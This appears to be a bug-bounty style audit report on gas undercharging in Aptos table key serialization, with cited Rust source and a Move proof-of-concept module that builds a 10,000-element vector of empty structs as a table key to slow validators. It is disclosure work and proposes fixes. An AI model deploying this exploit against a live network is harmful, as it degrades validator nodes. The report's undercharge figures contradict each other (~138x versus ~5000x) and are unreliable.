# Audit Report

## Title
Gas Undercharge in Table Key Serialization for Iteration-Heavy Zero-Output Data Structures

## Summary
The `PER_BYTE_SERIALIZED` gas parameters for table native functions are calibrated based on serialized output size, but the actual computational cost is proportional to the number of iterations during serialization. This allows attackers to create table keys using vectors of zero-sized structs that require extensive iteration (O(N) CPU operations) while producing minimal serialized output (~2-3 bytes), resulting in massive gas undercharging.

## Finding Description

The table native functions (`add_box`, `borrow_box`, `contains_box`, `remove_box`) charge gas for key serialization using a per-byte rate defined in the gas schedule. [1](#0-0) 

The current value is set to 36 internal gas units per byte with a comment acknowledging these are "dummy values". [2](#0-1) 

The critical issue occurs in the serialization flow:
1. Base cost is charged upfront [3](#0-2) 
2. Key serialization work is performed [4](#0-3) 
3. Gas cost is calculated based on output bytes [5](#0-4) 
4. Gas is charged AFTER work is complete [6](#0-5) 

The BCS serialization implementation iterates through ALL vector elements regardless of their serialized size. [7](#0-6) 

**Attack Vector:**
1. Attacker defines: `struct Empty has copy, drop {}`
2. Attacker creates `vector<Empty>` with N=10,000 elements  
3. Uses this vector as a table key in operations

**Cost Analysis:**
- Serialized output: ~2 bytes (ULEB128 length encoding for 10,000)
- Gas charged: 36 × 2 = **72 internal gas units**
- Actual CPU work: **10,000 iterations** with:
  - SerializationReadyValue struct creation per element [8](#0-7) 
  - Depth checking, pattern matching, BCS state management
- **Undercharge ratio: ~138x** (10,000 operations / 72 gas units)

This breaks the invariant: "All operations must respect gas, storage, and computational limits" by allowing disproportionate CPU consumption relative to gas paid.

## Impact Explanation

This qualifies as **High Severity** under Aptos bug bounty criteria: "Validator node slowdowns."

Each undercharged table operation causes validators to perform ~10,000 iterations while charging gas for only 2 bytes of output. An attacker can:
- Call table operations repeatedly within a transaction, reusing the same vector
- Submit multiple transactions with undercharged operations  
- Target multiple validators simultaneously through transaction broadcast

While the attacker must pay gas to create the vector initially, the serialization undercharge is multiplicative across operations, creating a cumulative slowdown effect on validator nodes processing these transactions.

## Likelihood Explanation

**Likelihood: Medium-High**

The attack is straightforward to execute:
- No special privileges required
- Empty structs are valid Move types with `copy` and `drop` abilities
- No type restrictions prevent their use as table keys
- The vector can be reused across multiple operations in a single transaction

The limiting factors are:
- Transaction gas limits cap total operations per transaction
- Creating large vectors has upfront costs
- Requires intentional malicious design (unlikely to occur accidentally)

## Recommendation

**Immediate Fix:** Implement iteration-aware gas charging that accounts for computational complexity beyond output size.

**Proposed Solution:**
1. Add a per-iteration gas parameter separate from per-byte charging
2. Track iteration count during serialization and charge accordingly
3. Consider capping maximum iterations for table keys

**Code Fix Pattern:**
```rust
// In serialize_key function, track iterations
let mut iteration_count = 0;
let key_bytes = serialize_key_with_count(
    &function_value_extension, 
    &table.key_layout, 
    &key,
    &mut iteration_count
)?;

// Charge for both bytes AND iterations
let byte_cost = ADD_BOX_PER_BYTE_SERIALIZED * NumBytes::new(key_bytes.len() as u64);
let iteration_cost = ADD_BOX_PER_ITERATION * iteration_count;
context.charge(byte_cost + iteration_cost)?;
```

**Alternative:** Set maximum allowed iterations for table key serialization (e.g., 1000) and abort if exceeded.

## Proof of Concept

```move
module attacker::exploit {
    use std::vector;
    use aptos_std::table;

    struct Empty has copy, drop {}
    
    struct Attack has key {
        tbl: table::Table<vector<Empty>, u64>
    }

    // Create undercharged table key
    public entry fun exploit_undercharge(account: &signer) {
        // Create vector with 10,000 empty structs
        let large_key = vector::empty<Empty>();
        let i = 0;
        while (i < 10000) {
            vector::push_back(&mut large_key, Empty {});
            i = i + 1;
        };

        // Use as table key - pays ~72 gas for serialization
        // but causes ~10,000 iterations (should cost ~360,000 gas)
        let tbl = table::new<vector<Empty>, u64>();
        table::add(&mut tbl, large_key, 42);
        
        // Can call multiple operations with same key
        // Each operation: 72 gas charged, 10,000 iterations performed
        let _ = table::borrow(&tbl, &large_key);
        let _ = table::contains(&tbl, &large_key);
        
        // 3 operations × ~360,000 actual cost = ~1,080,000 gas worth of CPU
        // 3 operations × 72 charged = 216 gas paid for serialization
        // Undercharge ratio: ~5000x across transaction

        move_to(account, Attack { tbl });
    }
}
```

**Notes**

This vulnerability exists due to a fundamental mismatch between gas calibration (based on output size) and actual computational cost (based on iterations). The maximum VM value depth of 128 [9](#0-8)  does not prevent this attack, as it limits nesting depth, not iteration count within a single vector.

The TODO comment acknowledging late gas charging [10](#0-9)  indicates awareness of the charging order issue, but the calibration problem (36 gas/byte) is a separate, more fundamental concern that enables this exploitation.

### Citations

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/table.rs (L14-14)
```rust
        // These are dummy value, they copied from storage gas in aptos-core/aptos-vm/src/aptos_vm_impl.rs
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/table.rs (L23-23)
```rust
        [add_box_per_byte_serialized: InternalGasPerByte, "add_box.per_byte_serialized", 36],
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L394-394)
```rust
    context.charge(ADD_BOX_BASE)?;
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L411-411)
```rust
    let key_bytes = serialize_key(&function_value_extension, &table.key_layout, &key)?;
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L412-412)
```rust
    let key_cost = ADD_BOX_PER_BYTE_SERIALIZED * NumBytes::new(key_bytes.len() as u64);
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L437-438)
```rust
    // TODO(Gas): Figure out a way to charge this earlier.
    context.charge(key_cost)?;
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L57-57)
```rust
pub const DEFAULT_MAX_VM_VALUE_NESTED_DEPTH: u64 = 128;
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L4898-4909)
```rust
                    (_, Container::Vec(r)) => {
                        let v = r.borrow();
                        let mut t = serializer.serialize_seq(Some(v.len()))?;
                        for value in v.iter() {
                            t.serialize_element(&SerializationReadyValue {
                                ctx: self.ctx,
                                layout,
                                value,
                                depth: self.depth + 1,
                            })?;
                        }
                        t.end()
```
